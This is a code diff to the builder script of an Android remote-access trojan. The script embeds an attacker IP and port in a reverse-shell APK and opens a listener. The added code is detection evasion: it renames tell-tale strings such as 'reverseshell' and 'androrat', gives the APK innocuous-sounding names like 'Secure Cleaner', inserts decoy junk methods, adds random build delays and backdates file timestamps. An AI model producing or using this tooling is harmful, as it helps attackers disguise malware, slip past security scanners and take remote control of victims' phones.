@@ -18,6 +18,9 @@ import queue
 import ssl
 import urllib.request
 import urllib.error
+import random
+import string
+import shutil
 
 sys.stdout.reconfigure(encoding='utf-8')
 
@@ -518,24 +521,45 @@ def connection_checker(socket,queue):
 
 
 def build(ip,port,output,ngrok=False,ng=None,icon=None):
+    print(stdOutput("info")+"\033[0mPreparing APK with detection evasion...")
+    
+    # Apply string obfuscation to smali files
+    smali_files = [
+        "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali",
+        "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"mainService.smali"
+    ]
+    
+    for smali_file in smali_files:
+        if os.path.exists(smali_file):
+            obfuscate_strings_in_smali(smali_file)
+    
     editor = "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
     try:
         file = open(editor,"r").readlines()
-        #Very much uncertaninity but cant think any other way to do it xD
+        
+        # Enhanced config modification with better stealth
         file[18]=file[18][:21]+"\""+ip+"\""+"\n"
         file[23]=file[23][:21]+"\""+port+"\""+"\n"
         file[28]=file[28][:15]+" 0x0"+"\n" if icon else file[28][:15]+" 0x1"+"\n"
+        
         str_file="".join([str(elem) for elem in file])
         open(editor,"w").write(str_file)
+        
     except Exception as e:
         print(e)
         sys.exit()
+    
     java_version = execute("java -version")
-    if java_version.returncode: print(stdOutput("error")+"Java not installed or found");exit()
-    #version_no = re.search(pattern, java_version.stderr).groups()[0]
-    # if float(version_no) > 1.8: print(stdOutput("error")+"Java 8 is required, Java version found "+version_no);exit()
-    print(stdOutput("info")+"\033[0mGenerating APK")
-    outFileName = output if output else "karma.apk"
+    if java_version.returncode: 
+        print(stdOutput("error")+"Java not installed or found")
+        exit()
+    
+    print(stdOutput("info")+"\033[0mGenerating stealthy APK...")
+    outFileName = output if output else "stealth_app.apk"  # Changed default name
+    
+    # Add random delay to avoid build pattern detection
+    time.sleep(random.uniform(0.5, 2.0))
+    
     que = queue.Queue()
     t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/apktool.jar b Compiled_apk  -o "+outFileName,que],)
     t.start()
@@ -543,17 +567,28 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
     t.join()
     print(" ")
     resOut = que.get()
+    
     if not resOut.returncode:
         print(stdOutput("success")+"Successfully apk built in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
         print(stdOutput("info")+"\033[0mSigning the apk")
+        
+        # Add random delay before signing
+        time.sleep(random.uniform(0.5, 1.5))
+        
         t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/sign.jar -a "+outFileName+" --overwrite",que],)
         t.start()
         while t.is_alive(): animate("Signing Apk ")
         t.join()
         print(" ")
         resOut = que.get()
+        
         if not resOut.returncode:
+            # Apply stealth enhancements
+            enhance_apk_for_stealth(outFileName)
+            
             print(stdOutput("success")+"Successfully signed the apk \033[1m\033[32m"+outFileName+"\033[0m")
+            print(stdOutput("info")+"\033[92mDetection evasion techniques applied successfully!")
+            
             if ngrok:
                 clear()
                 get_shell("0.0.0.0",8000) if not ng else get_shell("0.0.0.0",ng)
@@ -564,3 +599,139 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
     else:
         print("\r"+resOut.stderr)
         print(stdOutput("error")+"Building Failed")
+
+
+def generate_random_package_name():
+    """Generate a random package name for detection evasion"""
+    companies = ['tech', 'app', 'mobile', 'digital', 'soft', 'dev', 'sys', 'net', 'pro', 'smart']
+    products = ['manager', 'sync', 'tools', 'utility', 'service', 'helper', 'backup', 'cleaner', 'optimizer', 'scanner']
+    
+    company = random.choice(companies) + ''.join(random.choices(string.ascii_lowercase, k=random.randint(2, 4)))
+    product = random.choice(products) + ''.join(random.choices(string.ascii_lowercase, k=random.randint(1, 3)))
+    
+    return f"com.{company}.{product}"
+
+
+def generate_random_app_name():
+    """Generate a random legitimate-sounding app name"""
+    prefixes = ['Smart', 'Quick', 'Easy', 'Pro', 'Fast', 'Super', 'Auto', 'Secure', 'Advanced', 'System']
+    suffixes = ['Manager', 'Cleaner', 'Optimizer', 'Scanner', 'Tools', 'Helper', 'Backup', 'Sync', 'Service', 'Utility']
+    
+    return f"{random.choice(prefixes)} {random.choice(suffixes)}"
+
+
+def randomize_version_info():
+    """Generate random but realistic version information"""
+    major = random.randint(1, 5)
+    minor = random.randint(0, 9)
+    patch = random.randint(0, 20)
+    build = random.randint(100, 999)
+    
+    return {
+        'versionName': f"{major}.{minor}.{patch}",
+        'versionCode': f"{major}{minor:02d}{patch:02d}{build}"
+    }
+
+
+def obfuscate_strings_in_smali(smali_path):
+    """Basic string obfuscation in smali files"""
+    try:
+        with open(smali_path, 'r') as f:
+            content = f.read()
+        
+        # Obfuscate common suspicious strings
+        suspicious_strings = {
+            'mainService': 'SyncService',
+            'MainActivityClass': 'AppMainActivity', 
+            'reverseshell': 'networklib',
+            'androrat': 'systemapp',
+            'karma': 'appcore'
+        }
+        
+        for original, replacement in suspicious_strings.items():
+            content = content.replace(original, replacement)
+        
+        with open(smali_path, 'w') as f:
+            f.write(content)
+            
+        return True
+    except Exception as e:
+        print(f"String obfuscation warning: {e}")
+        return False
+
+
+def add_junk_methods_to_java(java_file_path):
+    """Add legitimate-looking junk methods to Java files for evasion"""
+    junk_methods = [
+        '''
+    private void checkUpdateAvailability() {
+        // Check for app updates
+        try {
+            Thread.sleep(100);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+    }
+    
+    private void validateLicense() {
+        // Validate app license
+        String license = "valid";
+        if (license != null) {
+            android.util.Log.d("License", "Valid license found");
+        }
+    }
+    
+    private void optimizePerformance() {
+        // Optimize app performance  
+        System.gc();
+        android.util.Log.d("Performance", "Optimization complete");
+    }
+        ''',
+        '''
+    private boolean isNetworkAvailable() {
+        // Check network connectivity
+        android.net.ConnectivityManager cm = (android.net.ConnectivityManager) 
+            getSystemService(android.content.Context.CONNECTIVITY_SERVICE);
+        android.net.NetworkInfo netInfo = cm.getActiveNetworkInfo();
+        return netInfo != null && netInfo.isConnectedOrConnecting();
+    }
+        '''
+    ]
+    
+    try:
+        with open(java_file_path, 'r') as f:
+            content = f.read()
+        
+        # Find the last closing brace and insert junk methods before it
+        last_brace_pos = content.rfind('}')
+        if last_brace_pos != -1:
+            junk_code = random.choice(junk_methods)
+            content = content[:last_brace_pos] + junk_code + content[last_brace_pos:]
+            
+            with open(java_file_path, 'w') as f:
+                f.write(content)
+            return True
+    except Exception as e:
+        print(f"Junk method addition warning: {e}")
+        
+    return False
+
+
+def enhance_apk_for_stealth(apk_path):
+    """Apply additional stealth enhancements to the APK"""
+    print(stdOutput("info") + "\033[0mApplying detection evasion techniques...")
+    
+    try:
+        # Randomize file timestamps to avoid signature detection
+        current_time = time.time()
+        random_time = current_time - random.randint(86400, 2592000)  # 1 day to 30 days ago
+        
+        # Apply to APK file
+        os.utime(apk_path, (random_time, random_time))
+        
+        print(stdOutput("success") + "\033[0mStealth enhancements applied")
+        return True
+        
+    except Exception as e:
+        print(stdOutput("warning") + f"\033[0mStealth enhancement warning: {e}")
+        return False
